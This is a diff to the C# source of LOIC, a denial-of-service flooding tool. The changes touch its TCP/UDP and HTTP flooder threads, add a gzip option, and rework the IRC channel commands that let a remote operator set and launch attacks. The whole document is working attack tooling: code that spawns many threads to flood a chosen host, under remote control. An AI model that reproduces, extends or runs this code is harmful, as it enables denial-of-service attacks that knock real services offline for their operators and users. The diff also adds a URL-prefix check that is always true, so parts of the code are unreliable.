@@ -19,7 +19,7 @@ namespace LOIC
 		private static HTTPFlooder[] http;
 		private static string sHost, sIP, sMethod, sData, sSubsite;
 		private static int iPort, iThreads, iProtocol, iDelay, iTimeout;
-		private static bool bResp, intShowStats;
+		private static bool intShowStats;
 		private IrcClient irc;
 		private Thread irclisten;
 		private string channel;
@@ -63,7 +63,7 @@ namespace LOIC
                     {
                         if ( sHost.Length > 0 )
                         {
-                            if (!sHost.Contains("://")) { sHost = "http://" + sHost; }
+                            if (!sHost.Contains("://")) { sHost = String.Concat("http://", sHost); }
                             sHost = new Uri(sHost).Host;
                         }
                         else { sHost = sIP; }
@@ -88,14 +88,12 @@ namespace LOIC
 
                     try { iTimeout = Convert.ToInt32(txtTimeout.Text); }
                     catch { throw new Exception("What's up with something like that in the timeout box? =S"); }
-
-                    bResp = chkResp.Checked;
                 }
-                catch (Exception ex) {
+                catch (Exception ex)
+                {
                     if (silent) return;
                     new frmWtf().Show(); MessageBox.Show(ex.Message, "What the shit."); return; 
                 }
-
                 cmdAttack.Text = "Stop flooding";
 
                 if (String.Equals(sMethod, "TCP") || String.Equals(sMethod, "UDP"))
@@ -103,7 +101,7 @@ namespace LOIC
                     xxp = new XXPFlooder[iThreads];
                     for (int a = 0; a < xxp.Length; a++)
                     {
-                        xxp[a] = new XXPFlooder(sIP, iPort, iProtocol, iDelay, bResp, sData, chkMsgRandom.Checked);
+                        xxp[a] = new XXPFlooder(sIP, iPort, iProtocol, iDelay, chkWaitReply.Checked, sData, chkAllowRandom.Checked);
                         xxp[a].Start();
                     }
                 }
@@ -112,7 +110,7 @@ namespace LOIC
                     http = new HTTPFlooder[iThreads];
                     for (int a = 0; a < http.Length; a++)
                     {
-                        http[a] = new HTTPFlooder(sHost, sIP, iPort, sSubsite, bResp, iDelay, iTimeout, chkRandom.Checked);
+                        http[a] = new HTTPFlooder(sHost, sIP, iPort, sSubsite, chkWaitReply.Checked, iDelay, iTimeout, chkAllowRandom.Checked, chkAllowGzip.Checked);
                         http[a].Start();
                     }
                 }
@@ -161,8 +159,7 @@ namespace LOIC
                 MessageBox.Show("A URL is fine too...", "What the shit.");
                 return;
             }
-            if (sHost.StartsWith("https://")) sHost = sHost.Replace("https://", "http://");
-            else if (!sHost.StartsWith("http://")) sHost = String.Concat("http://", sHost);
+            if ( !sHost.StartsWith("http://") || !sHost.StartsWith("https://") ) sHost = String.Concat("http://", sHost);
             try { txtTarget.Text = Dns.GetHostEntry(new Uri(sHost).Host).AddressList[0].ToString(); }
             catch
             {
@@ -420,7 +417,18 @@ namespace LOIC
                 if (sp.Length > 1)
                 {
                     string cmd = sp[0];
-                    string value = sp[1];
+
+                    // Have fun finding value :)
+                    string value = null;
+                    for (int key = 0; key < sp.Length; ++key)
+                    {
+                        if (key >= 1)
+                        {
+                            value = value + sp[key] + ( (key+1 < sp.Length) ? "=" : null);
+                        }
+                    }
+                    // ... and we got it :D
+
                     int num;
                     bool isnum;
                     switch (cmd.ToLower())
@@ -434,7 +442,6 @@ namespace LOIC
                             LockOnURL(true);
                             break;
                         case "timeout":
-                            
                             isnum = int.TryParse(value, out num);
                             if (isnum)
                             {
@@ -464,23 +471,31 @@ namespace LOIC
                         case "wait":
                             if (value.ToLower() == "true")
                             {
-                                chkResp.Checked = true;
+                                chkWaitReply.Checked = true;
                             }
                             else if (value.ToLower() == "false")
                             {
-                                chkResp.Checked = false;
+                                chkWaitReply.Checked = false;
                             }
                             break;
                         case "random":
                             if (value.ToLower() == "true")
                             {
-								chkRandom.Checked = true; //HTTP
-								chkMsgRandom.Checked = true; //TCP_UDP
+                                chkAllowRandom.Checked = true;
                             }
                             else if (value.ToLower() == "false")
                             {
-								chkRandom.Checked = false; //HTTP
-								chkMsgRandom.Checked = false; //TCP_UDP
+                                chkAllowRandom.Checked = false;
+                            }
+                            break;
+                        case "gzip":
+                            if (value.ToLower() == "true")
+                            {
+                                chkAllowGzip.Checked = true;
+                            }
+                            else if (value.ToLower() == "false")
+                            {
+                                chkAllowGzip.Checked = false;
                             }
                             break;
                             case "speed":
@@ -510,9 +525,9 @@ namespace LOIC
                          int index = cbMethod.FindString("TCP");
                          if (index != -1) { cbMethod.SelectedIndex = index; }
                          txtThreads.Text = "10";
-                         chkResp.Checked = true;
-                         chkRandom.Checked = false;
-                         chkMsgRandom.Checked = false;
+                         chkWaitReply.Checked = true;
+                         chkAllowRandom.Checked = false;
+                         chkAllowGzip.Checked = false;
                          tbSpeed.Value = 0;
                     }
                 }
@@ -527,7 +542,7 @@ namespace LOIC
                 string server = e.Line.Split(' ')[2];
                 irc.WriteLine("PONG " + server, Priority.Critical);
             }
-            else if ( command.Equals("422") | command.Equals("376") ) // 422: motd missing // 376: end of motd
+            else if ( command.Equals("422") || command.Equals("376") ) // 422: motd missing // 376: end of motd
             {
                 if (OpList != null) OpList.Clear();
                 irc.RfcJoin(channel);
@@ -613,7 +628,7 @@ namespace LOIC
 						int iaRequested = http[a].Requested;
 						int iaFailed = http[a].Failed;
 						http[a] = null;
-						http[a] = new HTTPFlooder(sHost, sIP, iPort, sSubsite, bResp, iDelay, iTimeout, chkRandom.Checked);
+						http[a] = new HTTPFlooder(sHost, sIP, iPort, sSubsite, chkWaitReply.Checked, iDelay, iTimeout, chkAllowRandom.Checked, chkAllowGzip.Checked);
 						http[a].Downloaded = iaDownloaded;
 						http[a].Requested = iaRequested;
 						http[a].Failed = iaFailed;
